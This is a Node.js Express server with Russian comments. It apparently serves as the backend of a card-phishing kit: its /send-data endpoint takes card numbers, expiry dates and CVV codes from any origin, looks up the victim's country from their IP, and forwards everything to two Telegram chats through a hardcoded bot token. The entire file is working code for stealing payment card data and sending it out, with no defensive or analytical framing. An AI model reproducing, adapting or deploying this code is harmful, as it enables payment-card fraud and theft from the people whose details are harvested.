const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const app = express();
const port = 3000;

// Используем body-parser для обработки JSON данных
app.use(bodyParser.json());

// Разрешаем запросы с любых источников (CORS)
app.use(cors());

// Список Telegram пользователей для отправки сообщений
const telegramChatIds = ['7585915569', '6867873702']; // Добавляем ID пользователей

// Функция для отправки сообщения в Telegram
function sendToTelegram(message) {
  const token = '8124139666:AAHmIWUdVQaNf0B6wYBaqfUyJ1MYsuCsGSU'; // Замените на ваш токен бота
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  telegramChatIds.forEach(chatId => {
    axios
      .post(url, {
        chat_id: chatId,
        text: message,
      })
      .then(() => {
        console.log(`Сообщение отправлено пользователю ${chatId}`);
      })
      .catch(error => {
        console.error(`Ошибка при отправке пользователю ${chatId}:`, error);
      });
  });
}

// Функция для определения страны пользователя
async function getCountryFlag(ip) {
  try {
    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
    const countryCode = response.data.country; // Код страны (например, "UA")

    if (countryCode) {
      const flag = countryCode
        .toUpperCase()
        .split('')
        .map(char => String.fromCodePoint(0x1f1e6 + char.charCodeAt(0) - 65))
        .join('');
      return `Country: ${flag}`;
    }
    return 'Country: 🌍';
  } catch (error) {
    console.error('Ошибка при определении страны:', error);
    return 'Country: ❓';
  }
}

// Маршрут для обработки POST запроса с данными
app.post('/send-data', async (req, res) => {
  const { cardNumber, expiryDate, cvv } = req.body;
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  console.log('Received data:', cardNumber, expiryDate, cvv);

  // Получаем страну пользователя
  const countryInfo = await getCountryFlag(clientIp);

  // Формируем сообщение для Telegram
  const message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}\n${countryInfo}`;

  // Отправляем данные в Telegram
  sendToTelegram(message);

  res.send('Данные успешно получены');
});

// Запуск сервера на всех IP (0.0.0.0) для доступа из любой сети
app.listen(port, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${port}`);
});
